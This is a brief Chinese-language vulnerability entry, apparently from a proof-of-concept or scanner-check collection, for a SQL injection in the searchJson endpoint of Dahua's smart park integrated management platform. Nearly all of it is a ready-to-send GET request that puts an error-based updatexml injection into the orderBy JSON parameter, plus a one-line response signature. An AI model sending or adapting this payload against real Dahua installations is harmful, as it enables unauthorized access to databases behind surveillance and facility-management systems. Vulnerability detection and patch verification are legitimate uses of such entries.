# 大华智慧园区综合管理平台searchJsonSQL注入漏洞

大华 ｜ SQL注入 ｜ —
- **请求**：`GET /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(388609)),0x7e),1)--%22%7D/extend/%7B%7D HTTP/1.1`
- **响应特征**：-1